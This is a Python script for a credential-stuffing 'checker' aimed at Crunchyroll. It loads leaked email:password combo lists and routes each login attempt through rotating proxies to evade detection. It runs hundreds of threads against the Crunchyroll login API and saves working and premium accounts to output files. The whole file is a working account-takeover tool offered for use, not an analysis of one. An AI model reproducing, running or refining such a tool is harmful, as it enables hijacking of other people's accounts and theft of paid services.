import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import uuid
import functools
import datetime
import threading
from colorama import Fore, Style
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4
from requests import Session

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0
print()
start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Crunchyroll Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Crunchyroll Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Proxy Error : {proxy_error} | CPM : {cpm}')

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def crunchy_checker(email, password):
    date = datetime.datetime.now()
    formated_date = date.strftime('%d/%m/%Y')
    global invalid, valid, custom, premium, proxy_error, accounts_processed
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(open("proxies.txt", "r").readlines()) != 0 else None

    session = Session()

    proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
             if len(open("./proxies.txt", "r").readlines()) != 0
             else None)
    if ":" in proxy and len(proxy.split(":")) == 4:
        ip, port, user, pw = proxy.split(":")
        proxy_string = f"http://{user}:{pw}@{ip}:{port}"
    else:
        ip, port = proxy.split(":")
        proxy_string = f"http://{ip}:{port}"

    session.proxies = {
        "http": proxy_string,
        "https": proxy_string
    }

    try:
        guid = str(uuid4())

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US"
        }

        payload = f"device_type=com.crunchyroll.windows.desktop&device_id={guid}&access_token=LNDJgOit5yaRIWN"

        req = session.post(f"https://api.crunchyroll.com/start_session.0.json", headers=headers, data=payload)
        session_id = req.json()['data']['session_id']

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "en-US"
        }
        payload = {
            'account': email,
            'password': password,
            'session_id': session_id,
            'locale': 'enUS',
            'version':' 1.3.1.0',
            'connectivity_type': 'ethernet'
        }

        login = session.post("https://api.crunchyroll.com/login.0.json", headers=headers, data=payload)
        if any(key in login.text for key in ['You forgot to put in your password.','Incorrect login information.']):
            invalid += 1
            accounts_processed += 1
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            update_console_title()
            return
        elif '"premium":""' in login.text:
            custom += 1
            accounts_processed += 1
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            update_console_title()
            folder = f"Checked/Crunchyroll"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open(f"Checked/Crunchyroll/custom_crunchyroll.txt", "a+", encoding='utf-8') as crunchyroll_penis2:
                crunchyroll_penis2.write(f"{email}:{password} | A2F" + "\n")
            return
        elif '"user_id"' not in login.text:
            raise

        valid += 1
        accounts_processed += 1
        update_console_title()
        subscription = login.json()["data"]["user"]["access_type"]
        folder = f"Checked/Crunchyroll"
        if not os.path.exists(folder):
            os.makedirs(folder)

        if subscription == "premium":
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
            with open(f"Checked/Crunchyroll/good_crunchyroll_premium.txt", "a+", encoding='utf-8') as premium_file:
                premium_file.write(f"{email}:{password} | Subscription: {subscription}" + "\n")
            premium += 1
            accounts_processed += 1
            update_console_title()
            return
        else:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {yellow}No Premium")
            with open(f"Checked/Crunchyroll/good_crunchyroll.txt", "a+", encoding='utf-8') as regular_file:
                regular_file.write(f"{email}:{password} | Subscription: {subscription}" + "\n")
            return
    except:
        proxy_error += 1
        update_console_title()
        crunchy_checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    crunchy_checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()